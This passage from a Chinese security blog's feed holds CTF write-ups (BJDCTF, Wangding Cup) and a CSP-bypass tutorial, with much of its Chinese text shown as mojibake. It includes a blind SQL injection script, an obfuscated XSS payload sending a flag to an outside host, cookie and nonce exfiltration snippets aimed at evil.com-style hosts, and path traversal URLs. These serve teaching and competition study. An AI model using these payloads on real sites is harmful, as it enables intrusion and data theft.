&quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}    r=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies,params=param)    time.sleep(0.5)    print(param)    if &quot;/static/img/dundundun.gif&quot; in r.text:        print(&quot;filter &quot;,param)        exit()    if &quot;y1ng&quot; in r.text:        return False    else :        return True#database: ms#mysql,sys#Hint: /Source Password#table:gtid_executed,sys_configresult=&quot;12,Hint: /Source Password: T1Me&quot;pos=len(result)*2+2while True:    flag=False    for i in string.printable:        if sqlinj(ord(i)):            result+=i            print(&quot;Found:&quot;+result)            flag=True            break        print(&quot;result:&quot;+result)    pos+=2    if flag is False:        break</code></pre><h2 id="notes"><a href="#notes" class="headerlink" title="notes"></a>notes</h2><p><a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p><p>flag.php</p><pre><code class="php">if ($_SERVER[&#39;REMOTE_ADDR&#39;] === &#39;172.26.176.2&#39;) //only admin, who is at 172.26.176.2, can get FLAG    echo FLAG;else echo $_SERVER[&#39;REMOTE_ADDR&#39;];</code></pre><p>botè„šæœ¬ï¼š</p><pre><code class="php">if (isset($_POST[&#39;url&#39;]) &amp;&amp; isset($_POST[&#39;captcha&#39;]) ) { // report bug to our admin who is at 172.26.176.2, our admin will access the bug url to check    $url = $_POST[&#39;url&#39;];    $captcha = $_POST[&#39;captcha&#39;];    if ( checkNote($url) &amp;&amp; checkNote(urldecode($url)) &amp;&amp; checkURL($url) &amp;&amp;  substr(md5($captcha), 0 , 6) === $_SESSION[&#39;captcha&#39;] ) {        //admin checking, it will take several seconds    } else alertMes(&#39;something wrong&#39;, &#39;./report_bugs.php&#39;);}?&gt;</code></pre><pre><code class="php">function checkURL($url) {    if ( preg_match(&#39;/[|~`^;&amp;]/m&#39;, $url) )        return false;    else return true;}function checkNote($s) {    $filter = &#39;/show|svg|archive|error|eval|on|atob|\\\u|&amp;#|let|cookie|meta|create|fetch|f[^a-z]*l[^a-z]*a[^a-z]*g|src|append|&lt;script&gt;|func|javascript|res|lo|then|ftp|const|ajax|\$|\&#39;|\&quot;/imX&#39;;    if (preg_match($filter, $s) || strlen($s) &gt;= 500 || strlen($s) &lt;= 1) return false;    else return true;}</code></pre><p>csp:<code>Content-Security-Policy: default-src &#39;self&#39; &#39;unsafe-inline&#39; &#39;unsafe-eval&#39;; img-src &#39;self&#39;; object-src &#39;none&#39;; require-trusted-types-for &#39;script&#39;;</code></p><p>ç»•è¿‡</p><pre><code class="javascript">&lt;script &gt;xmlhttp=new XMLHttpRequest();xmlhttp[`\x6fnreadystatechange`]=()=&gt;{if(xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200){document[`\x6cocati\x6fn`][`href`]=`http://ccreat\x65r.top:60006/`+xmlhttp[`\x72espo\x6eseText`];}};xmlhttp.open(`GET`,`/lib\x2ffla\x67.php`,true);xmlhttp.send();&lt;/script&gt;</code></pre><p>æ‹¿åˆ°flag</p><h2 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p> <a href="http://183.129.189.60:10057/" target="_blank" rel="noopener">http://183.129.189.60:10057/</a> </p><pre><code>/flag.php/index.php/log.php/login.php/www.zip</code></pre><p>flag.php</p><pre><code class="php">flag.phpå…³é”®ä»£ç å¦‚ä¸‹ï¼š$classname = $_GET[&#39;classname&#39;];$data = $_GET[&#39;data&#39;];$class = new $classname($data[&#39;a&#39;], $data[&#39;b&#39;]);Only users from the website can request this page. flag in /flag, have fun!</code></pre><p>å…ˆç™»é™†åº·åº·,éœ€è¦key,ç›¸å…³ä»£ç åœ¨:</p><pre><code class="php">&lt;?php    header(&quot;content-type:text/html;charset=utf-8&quot;);    session_start();    function getkey()    {        $key = &#39;&#39;;        $chars = str_split(&#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;);        for ($i = 0; $i &lt; 48; $i++)        {            $key = $key . $chars[random_int(0, 61)];        }        $_SESSION[&#39;key&#39;] = $key;        return $key;    }    function getreferer() {        static $referer;        if (isset($_SERVER[&#39;HTTP_REFERER&#39;])) {                $referer = $_SERVER[&#39;HTTP_REFERER&#39;];            }        elseif(isset($_POST[&#39;URL_REFERER&#39;])){                $referer = $_POST[&#39;URL_REFERER&#39;];            }        else{            die(&quot;Where are you from?&quot;);        }        return $referer;    }        $key = getkey();        $url = getreferer();        if(!preg_match(&quot;/^http[s]{0,1}:\/\//i&quot;, $url)){            die(&quot;What do you want to do?&quot;);        }        $host = parse_url($url, PHP_URL_HOST);        if(preg_match(&quot;/^google\.com$/i&quot;, $host) or preg_match(&quot;/(.*)\.google\.com$/i&quot;, $host)){            $headers = get_headers($url,1);            if($headers[&#39;dd&#39;] === &#39;MeAquaNo_1!!!&#39;){                echo $key;            }            else{                echo &#39;dd beheading!&#39;;            }        }        else{            die(&quot;Only dd working at Google can get the key!&quot;);        }</code></pre><h2 id="è€å¼€å‘"><a href="#è€å¼€å‘" class="headerlink" title="è€å¼€å‘"></a>è€å¼€å‘</h2><p> <a href="http://183.129.189.60:10000/" target="_blank" rel="noopener">http://183.129.189.60:10000/</a> </p><p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200523230022093.png" alt="image6583"></p><p><img src="C:%5CUsers%5C%E8%94%A1%E5%BB%BA%E6%96%8C%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200523230029887.png" alt="image6695"></p><p>User.php</p><pre><code class="php">&lt;?phpif ($_SERVER[&#39;SCRIPT_FILENAME&#39;] == __FILE__)    highlight_file(__FILE__);/** * @Entity * @Table(name=&quot;user&quot;) */class User{    /**      * @Id     * @Column(type=&quot;integer&quot;)     * @GeneratedValue     */    protected $uid;    /**      * @Column(type=&quot;string&quot;)      * @unique     */    protected $username;    /**      * @Column(type=&quot;string&quot;)      */    protected $password;    /**      * @Column(type=&quot;string&quot;)      */    protected $role;    public function __get($name)    {        if (property_exists(__CLASS__, $name)) {            return $this-&gt;$name;        } else {            throw new Exception(&quot;Class &quot; . __CLASS__ . &quot; doesn&#39;t have property &quot; . $name);        }    }    public function __set($name, $value)    {        if (property_exists(__CLASS__, $name)) {            $this-&gt;$name = $value;        } else {            throw new Exception(&quot;Class &quot; . __CLASS__ . &quot; doesn&#39;t have property &quot; . $name);        }    }}</code></pre><h2 id="å¸ƒå‰å²›"><a href="#å¸ƒå‰å²›" class="headerlink" title="å¸ƒå‰å²›"></a>å¸ƒå‰å²›</h2><p> <a href="http://183.129.189.60:10049/" target="_blank" rel="noopener">http://183.129.189.60:10049/</a> </p><p> <a href="http://183.129.189.60:10050/" target="_blank" rel="noopener">http://183.129.189.60:10050/</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/05/24/2020ç¬¬ä¸‰å±ŠBJDCTF/">http://blog.ccreater.top/2020/05/24/2020ç¬¬ä¸‰å±ŠBJDCTF/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bypass_csp</title>
      <link href="/2020/05/20/bypass_csp/"/>
      <url>/2020/05/20/bypass_csp/</url>
      
        <content type="html"><![CDATA[<h1 id="bypass-csp"><a href="#bypass-csp" class="headerlink" title="bypass csp"></a>bypass csp</h1><p>å†…å®¹å®‰å…¨ç­–ç•¥  (<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/CSP" target="_blank" rel="noopener">CSP</a>) æ˜¯ä¸€ä¸ªé¢å¤–çš„å®‰å…¨å±‚ï¼Œç”¨äºæ£€æµ‹å¹¶å‰Šå¼±æŸäº›ç‰¹å®šç±»å‹çš„æ”»å‡»ï¼ŒåŒ…æ‹¬è·¨ç«™è„šæœ¬ (<a href="https://developer.mozilla.org/en-US/docs/Glossary/XSS" target="_blank" rel="noopener">XSS</a>) å’Œæ•°æ®æ³¨å…¥æ”»å‡»ç­‰ã€‚æ— è®ºæ˜¯æ•°æ®ç›—å–ã€ç½‘ç«™å†…å®¹æ±¡æŸ“è¿˜æ˜¯æ•£å‘æ¶æ„è½¯ä»¶ï¼Œè¿™äº›æ”»å‡»éƒ½æ˜¯ä¸»è¦çš„æ‰‹æ®µã€‚ </p><h2 id="cspè¯­æ³•"><a href="#cspè¯­æ³•" class="headerlink" title="cspè¯­æ³•"></a>cspè¯­æ³•</h2><p>CSPçš„ç‰¹ç‚¹å°±æ˜¯ä»–æ˜¯åœ¨æµè§ˆå™¨å±‚é¢åšçš„é˜²æŠ¤ï¼Œæ˜¯å’ŒåŒæºç­–ç•¥åŒä¸€çº§åˆ«ï¼Œé™¤éæµè§ˆå™¨æœ¬èº«å‡ºç°æ¼æ´ï¼Œå¦åˆ™ä¸å¯èƒ½ä»æœºåˆ¶ä¸Šç»•è¿‡ã€‚</p><p>CSPåªå…è®¸è¢«è®¤å¯çš„JSå—ã€JSæ–‡ä»¶ã€CSSç­‰è§£æï¼Œåªå…è®¸å‘æŒ‡å®šçš„åŸŸå‘èµ·è¯·æ±‚ã€‚</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP</a></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy</a></p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src" target="_blank" rel="noopener"><code>default-src</code></a> :åœ¨å…¶ä»–èµ„æºç±»å‹æ²¡æœ‰ç¬¦åˆè‡ªå·±çš„ç­–ç•¥æ—¶åº”ç”¨è¯¥ç­–ç•¥(æœ‰å…³å®Œæ•´åˆ—è¡¨æŸ¥çœ‹<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src" target="_blank" rel="noopener"><code>default-src</code></a> )</p><p><img src="https://images.seebug.org/content/images/2017/10/7b7e1d4c-9d9a-4bd0-ae6d-f266871fa300.png-w331s" alt="image773"></p><p><img src="https://images.seebug.org/content/images/2017/10/c5a45eca-7e0c-4ebf-8143-712e4594f2fd.png-w331s" alt="image878"></p><h3 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h3><p><code>script-src &#39;nonce-r4nd0m&#39; &#39;strict-dynamic&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;;</code></p><p>script-src ä¸­ strict-dynamic ä¸­çš„ä½œç”¨:</p><ul><li>ä¸¢å¼ƒç™½åå•</li><li>å…è®¸æ‰§è¡Œjsç”Ÿæˆçš„jsä»£ç ï¼Œä¾‹å¦‚ï¼šdocument.createElement(â€˜scriptâ€™) </li><li>ä½¿  nonce-only CSPs  å¯ä»¥å·¥ä½œ</li></ul><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200520164256.png" alt="image1216"></p><h3 id="ä¸€äº›æ³¨æ„ç‚¹"><a href="#ä¸€äº›æ³¨æ„ç‚¹" class="headerlink" title="ä¸€äº›æ³¨æ„ç‚¹"></a>ä¸€äº›æ³¨æ„ç‚¹</h3><p><code>https://cdn.com/*</code>åªèƒ½åŒ¹é…<code>https://cdn.com/*</code></p><h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><h3 id="cspç­–ç•¥ä¸å®Œå…¨å¯¼è‡´çš„ç»•è¿‡"><a href="#cspç­–ç•¥ä¸å®Œå…¨å¯¼è‡´çš„ç»•è¿‡" class="headerlink" title="cspç­–ç•¥ä¸å®Œå…¨å¯¼è‡´çš„ç»•è¿‡"></a>cspç­–ç•¥ä¸å®Œå…¨å¯¼è‡´çš„ç»•è¿‡</h3><h3 id="åˆ©ç”¨302è·³è½¬"><a href="#åˆ©ç”¨302è·³è½¬" class="headerlink" title="åˆ©ç”¨302è·³è½¬"></a>åˆ©ç”¨302è·³è½¬</h3><p><code>Content-Security-Policy: default-src &#39;self &#39;; script-src http://127.0.0.1/static/</code></p><p>å¦‚æœå¯ä¿¡åŸŸå†…å­˜åœ¨ä¸€ä¸ªå¯æ§çš„é‡å®šå‘æ–‡ä»¶ï¼Œé‚£ä¹ˆCSPçš„ç›®å½•é™åˆ¶å°±å¯ä»¥è¢«ç»•è¿‡ã€‚ </p><p>å‡è®¾staticç›®å½•ä¸‹å­˜åœ¨ä¸€ä¸ª302æ–‡ä»¶</p><pre><code>Static/302.php&lt;?php Header(&quot;location: &quot;.$_GET[&#39;url&#39;])?&gt;</code></pre><p>åƒåˆšæ‰ä¸€æ ·ï¼Œä¸Šä¼ ä¸€ä¸ªtest.jpg ç„¶åé€šè¿‡302.phpè·³è½¬åˆ°uploadç›®å½•åŠ è½½jså°±å¯ä»¥æˆåŠŸæ‰§è¡Œ</p><pre><code>&lt;script src=&quot;static/302.php?url=upload/test.jpg&quot;&gt;</code></pre><h3 id="ç»•è¿‡åŸŸé™åˆ¶çš„ä¸€äº›tricks"><a href="#ç»•è¿‡åŸŸé™åˆ¶çš„ä¸€äº›tricks" class="headerlink" title="ç»•è¿‡åŸŸé™åˆ¶çš„ä¸€äº›tricks"></a>ç»•è¿‡åŸŸé™åˆ¶çš„ä¸€äº›tricks</h3><p><code>Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;</code></p><pre><code class="html">&lt;link rel=&quot;prefetch&quot; href=&quot;http://lorexxar.cn&quot;&gt; (H5é¢„åŠ è½½)(only chrome)&lt;link rel=&quot;dns-prefetch&quot; href=&quot;http://lorexxar.cn&quot;&gt; ï¼ˆDNSé¢„åŠ è½½ï¼‰&lt;meta http-equiv=&quot;refresh&quot; content=&quot;5;http://lorexxar.cn?c=[cookie]&quot;&gt;</code></pre><h3 id="åˆ©ç”¨å¯ä¿¡åŸŸçš„èµ„æºç»•è¿‡"><a href="#åˆ©ç”¨å¯ä¿¡åŸŸçš„èµ„æºç»•è¿‡" class="headerlink" title="åˆ©ç”¨å¯ä¿¡åŸŸçš„èµ„æºç»•è¿‡"></a>åˆ©ç”¨å¯ä¿¡åŸŸçš„èµ„æºç»•è¿‡</h3><p>å¾ˆå¤šç½‘ç«™éƒ½ä¼šå°†google,baiduâ€¦â€¦æ·»åŠ åˆ°å¯ä¿¡åŸŸé‡Œé¢ï¼Œè€Œå¦‚æœé‡Œé¢å­˜åœ¨å¯æ§çš„è¾“å‡ºæˆ‘ä»¬ä¾¿å¯ä»¥ç»•è¿‡csp</p><p>å¸¸ç”¨å¯æ§jsonp: <a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a> </p><h3 id="bypass-nonce"><a href="#bypass-nonce" class="headerlink" title="bypass nonce"></a>bypass nonce</h3><h4 id="åˆ©ç”¨-lt-base-gt-æ ‡ç­¾"><a href="#åˆ©ç”¨-lt-base-gt-æ ‡ç­¾" class="headerlink" title="åˆ©ç”¨&lt;base&gt;æ ‡ç­¾"></a>åˆ©ç”¨<code>&lt;base&gt;</code>æ ‡ç­¾</h4><p>Specify a default URL and a default target for all links on a page:</p><pre><code class="html">&lt;head&gt;  &lt;base href=&quot;https://www.evil.com/&quot; target=&quot;_blank&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;img src=&quot;images/stickman.gif&quot; width=&quot;24&quot; height=&quot;39&quot; alt=&quot;Stickman&quot;&gt;&lt;!-- load  https://www.evil.com/images/stickman.gif --&gt;&lt;a href=&quot;tags/tag_base.asp&quot;&gt;HTML base Tag&lt;/a&gt;&lt;/body&gt;&lt;!-- point to https://www.evil.com/tags/tag_base.asp --&gt;</code></pre><p>å› æ­¤æˆ‘ä»¬å¯ä»¥è®¾ç½®ä¸ª<code>&lt;base&gt;</code>æ ‡ç­¾ï¼Œå°†ç›¸å¯¹è·¯å¾„å¯¼å‘æ¶æ„çš„ç½‘ç«™</p><pre><code class="html">&lt;!-- XSS --&gt;&lt;base href=&quot;https://evil.com/&quot;&gt;&lt;!-- End XSS --&gt;â€¦&lt;script src=&quot;foo/bar.js&quot; nonce=&quot;r4nd0m&quot;&gt;&lt;/script&gt;</code></pre><p><a href="https://evil.com/foo/bar.js" target="_blank" rel="noopener">https://evil.com/foo/bar.js</a></p><pre><code>alert(0000);</code></pre><p>æˆåŠŸæ‰§è¡Œ</p><p>é˜²å¾¡æ–¹å¼ï¼š</p><p>åœ¨cspä¸­æ·»åŠ ï¼šbase-uri â€˜noneâ€™ æˆ– base-uri â€˜selfâ€™</p><h4 id="åˆ©ç”¨chrome-bug-æ¥ä¿®æ”¹script-srcçš„å€¼"><a href="#åˆ©ç”¨chrome-bug-æ¥ä¿®æ”¹script-srcçš„å€¼" class="headerlink" title="åˆ©ç”¨chrome bug æ¥ä¿®æ”¹script srcçš„å€¼"></a>åˆ©ç”¨chrome bug æ¥ä¿®æ”¹script srcçš„å€¼</h4><pre><code class="html">&lt;!-- XSS --&gt;&lt;svg&gt;&lt;set href=&quot;victim&quot; attributeName=&quot;href&quot; to=&quot;data:,alert(1)&quot; /&gt;&lt;!-- End XSS --&gt;â€¦&lt;script id=&quot;victim&quot; src=&quot;foo.js&quot; nonce=&quot;r4nd0m&quot;&gt;&lt;/script&gt;</code></pre><p>SVGä¸­çš„setæ ‡ç­¾å¯ä»¥ä¿®æ”¹å…¶ä»–æ ‡ç­¾çš„å±æ€§å€¼</p><p>è¯¥æ¼æ´åœ¨chrome58ä¸­ä¿®å¤</p><h4 id="steal-nonce"><a href="#steal-nonce" class="headerlink" title="steal nonce"></a>steal nonce</h4><h5 id="via-CSS-selectors"><a href="#via-CSS-selectors" class="headerlink" title="via CSS selectors"></a>via CSS selectors</h5><pre><code class="html">&lt;!-- XSS --&gt;&lt;style&gt;script { display: block }script[nonce^=&quot;a&quot;]:after { content: url(&quot;record?a&quot;) }script[nonce^=&quot;b&quot;]:after { content: url(&quot;record?b&quot;) }&lt;/style&gt;&lt;!-- End XSS --&gt;&lt;script src=&quot;foo/bar.js&quot; nonce=&quot;r4nd0m&quot;&gt;&lt;/script&gt;</code></pre><p>å¯ä»¥è”åˆå…¶ä»–æ ‡ç­¾æ¥å‘å‡ºè¯·æ±‚ï¼Œå¦‚<code>&lt;a&gt;</code> â€¦</p><pre><code class="html">&lt;style&gt;script[nonce^=&quot;0&quot;]~a{background:url(&quot;http://y5pwcd.ceye.io/success&quot;)}&lt;/style&gt;</code></pre><p>ç›¸å…³çš„css è¯­æ³•</p><p> <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Selectors</a> </p><p> <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Attribute_selectors" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/CSS/Attribute_selectors</a> </p><h5 id="via-dangling-markup-attack"><a href="#via-dangling-markup-attack" class="headerlink" title="via dangling markup attack"></a>via dangling markup attack</h5><p>ç ´ååŸæœ‰çš„ç»“æ„ï¼Œå°†scriptæ ‡ç­¾å˜æˆæ–‡æœ¬ï¼Œè¯±ä½¿ç”¨æˆ·ç‚¹å‡»</p><pre><code class="html">&lt;!-- XSS --&gt; &lt;form method=&quot;post&quot; action=&quot;//evil.com/form&quot;&gt;&lt;input type=&quot;submit&quot; value=&quot;click&quot;&gt;&lt;textarea name=&quot;nonce&quot;&gt;&lt;!-- End XSS --&gt;&lt;script src=&quot;foo/bar.js&quot; nonce=&quot;r4nd0m&quot;&gt;&lt;/script&gt;</code></pre><h3 id="JS-framework-based-CSP-Bypasses"><a href="#JS-framework-based-CSP-Bypasses" class="headerlink" title="JS framework-based CSP Bypasses"></a>JS framework-based CSP Bypasses</h3><p>åˆ©ç”¨ä½ç‰ˆæœ¬JQueryç­‰jsæ¡†æ¶æ¼æ´æ¥ç»•è¿‡csp</p><h2 id="ç»•è¿‡å®ä¾‹"><a href="#ç»•è¿‡å®ä¾‹" class="headerlink" title="ç»•è¿‡å®ä¾‹"></a>ç»•è¿‡å®ä¾‹</h2><h2 id="ä¸€äº›å·¥å…·"><a href="#ä¸€äº›å·¥å…·" class="headerlink" title="ä¸€äº›å·¥å…·"></a>ä¸€äº›å·¥å…·</h2><p>æ£€æŸ¥csp: <a href="https://csp-evaluator.withgoogle.com/" target="_blank" rel="noopener">https://csp-evaluator.withgoogle.com/</a> </p><p>å¸¸ç”¨å¯æ§jsonp: <a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/jsonp.js#L32-L180</a> </p><p><a href="https://chrome.google.com/webstore/detail/csp-mitigator/gijlobangojajlbodabkpjpheeeokhfa" target="_blank" rel="noopener">csp mitigator</a> :ä¸€ä¸ªcspè°ƒè¯•å·¥å…·</p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p> [Spagnuolo_Hack In Bo - So we broke all CSPsâ€¦ You wonâ€™t guess what happened next!](<a href="https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack" target="_blank" rel="noopener">https://www.hackinbo.it/slides/1494231338_Spagnuolo_Hack</a> In Bo - So we broke all CSPsâ€¦ You wonâ€™t guess what happened next!.pdf) </p><p><a href="https://paper.seebug.org/423/" target="_blank" rel="noopener">å‰ç«¯é˜²å¾¡ä»å…¥é—¨åˆ°å¼ƒå‘â€“CSPå˜è¿</a></p><h2 id="æ”¶è—"><a href="#æ”¶è—" class="headerlink" title="æ”¶è—"></a>æ”¶è—</h2><p>Bypassing CSP script nonces via the browser cacheï¼š <a href="http://sebastian-lekies.de/csp/attacker.php" target="_blank" rel="noopener">http://sebastian-lekies.de/csp/attacker.php</a></p><p> <a href="https://hurricane618.me/2018/06/30/csp-bypass-summary/" target="_blank" rel="noopener">https://hurricane618.me/2018/06/30/csp-bypass-summary/</a> </p><p> <a href="https://www.netsparker.com/blog/web-security/private-data-stolen-exploiting-css-injection/" target="_blank" rel="noopener">https://www.netsparker.com/blog/web-security/private-data-stolen-exploiting-css-injection/</a> </p><p> <a href="https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense" target="_blank" rel="noopener">https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense</a> </p><p> <a href="https://storage.googleapis.com/pub-tools-public-publication-data/pdf/45542.pdf" target="_blank" rel="noopener">https://storage.googleapis.com/pub-tools-public-publication-data/pdf/45542.pdf</a> </p><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/05/20/bypass_csp/">http://blog.ccreater.top/2020/05/20/bypass_csp/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2020å¹´ç½‘é¼æ¯é’é¾™ç»„</title>
      <link href="/2020/05/12/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/"/>
      <url>/2020/05/12/2020%E5%B9%B4%E7%BD%91%E9%BC%8E%E6%9D%AF%E9%9D%92%E9%BE%99%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<h2 id="2020å¹´ç¬¬äºŒå±Šâ€œç½‘é¼æ¯â€ç½‘ç»œå®‰å…¨å¤§èµ›é’é¾™ç»„"><a href="#2020å¹´ç¬¬äºŒå±Šâ€œç½‘é¼æ¯â€ç½‘ç»œå®‰å…¨å¤§èµ›é’é¾™ç»„" class="headerlink" title="2020å¹´ç¬¬äºŒå±Šâ€œç½‘é¼æ¯â€ç½‘ç»œå®‰å…¨å¤§èµ›é’é¾™ç»„"></a>2020å¹´ç¬¬äºŒå±Šâ€œç½‘é¼æ¯â€ç½‘ç»œå®‰å…¨å¤§èµ›é’é¾™ç»„</h2><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="filejava"><a href="#filejava" class="headerlink" title="filejava"></a>filejava</h3><p>æµ‹è¯•å‘ç°DownloadServletå­˜åœ¨ç›®å½•ç©¿è¶Šæ¼æ´<br>è¯»å–web.xmlï¼Œç„¶åä¾æ¬¡è¯»å–å¯¹åº”çš„classæ–‡ä»¶<br> <a href="http://844bfa9b3fc8483d9988f6dc4541c4423a2ea466418e4bcb.cloudgame1.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=../../../../WEB-INF/web.xml" target="_blank" rel="noopener">http://844bfa9b3fc8483d9988f6dc4541c4423a2ea466418e4bcb.cloudgame1.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=../../../../WEB-INF/web.xml</a> </p><p>web.xml</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;web-app xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://java.sun.com/xml/ns/javaee&quot; xsi:schemaLocation=&quot;http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&quot; id=&quot;WebApp_ID&quot; version=&quot;2.5&quot;&gt;  &lt;display-name&gt;file_in_java&lt;/display-name&gt;  &lt;welcome-file-list&gt;    &lt;welcome-file&gt;upload.jsp&lt;/welcome-file&gt;  &lt;/welcome-file-list&gt;  &lt;servlet&gt;    &lt;description&gt;&lt;/description&gt;    &lt;display-name&gt;UploadServlet&lt;/display-name&gt;    &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt;    &lt;servlet-class&gt;cn.abc.servlet.UploadServlet&lt;/servlet-class&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;UploadServlet&lt;/servlet-name&gt;    &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;  &lt;servlet&gt;    &lt;description&gt;&lt;/description&gt;    &lt;display-name&gt;ListFileServlet&lt;/display-name&gt;    &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt;    &lt;servlet-class&gt;cn.abc.servlet.ListFileServlet&lt;/servlet-class&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;ListFileServlet&lt;/servlet-name&gt;    &lt;url-pattern&gt;/ListFileServlet&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;  &lt;servlet&gt;    &lt;description&gt;&lt;/description&gt;    &lt;display-name&gt;DownloadServlet&lt;/display-name&gt;    &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt;    &lt;servlet-class&gt;cn.abc.servlet.DownloadServlet&lt;/servlet-class&gt;  &lt;/servlet&gt;  &lt;servlet-mapping&gt;    &lt;servlet-name&gt;DownloadServlet&lt;/servlet-name&gt;    &lt;url-pattern&gt;/DownloadServlet&lt;/url-pattern&gt;  &lt;/servlet-mapping&gt;&lt;/web-app&gt;</code></pre><p> <a href="http://844bfa9b3fc8483d9988f6dc4541c4423a2ea466418e4bcb.cloudgame1.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=../../../../WEB-INF/classes/cn/abc/servlet/UploadServlet.class" target="_blank" rel="noopener">http://844bfa9b3fc8483d9988f6dc4541c4423a2ea466418e4bcb.cloudgame1.ichunqiu.com:8080/file_in_java/DownloadServlet?filename=../../../../WEB-INF/classes/cn/abc/servlet/UploadServlet.class</a></p><p> DownloadServlet</p><pre><code class="java">package cn.abc.servlet;import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.io.PrintStream;import java.net.URLEncoder;import javax.servlet.RequestDispatcher;import javax.servlet.ServletContext;import javax.servlet.ServletException;import javax.servlet.ServletOutputStream;import javax.servlet.http.HttpServlet;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;public class DownloadServlet  extends HttpServlet{  private static final long serialVersionUID = 1L;  protected void doGet(HttpServletRequest request, HttpServletResponse response)    throws ServletException, IOException  {    doPost(request, response);  }  protected void doPost(HttpServletRequest request, HttpServletResponse response)    throws ServletException, IOException  {    String fileName = request.getParameter(&quot;filename&quot;);    fileName = new String(fileName.getBytes(&quot;ISO8859-1&quot;), &quot;UTF-8&quot;);    System.out.println(&quot;filename=&quot; + fileName);    if ((fileName != null) &amp;&amp; (fileName.toLowerCase().contains(&quot;flag&quot;)))    {      request.setAttribute(&quot;message&quot;, &quot;ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½&quot;);      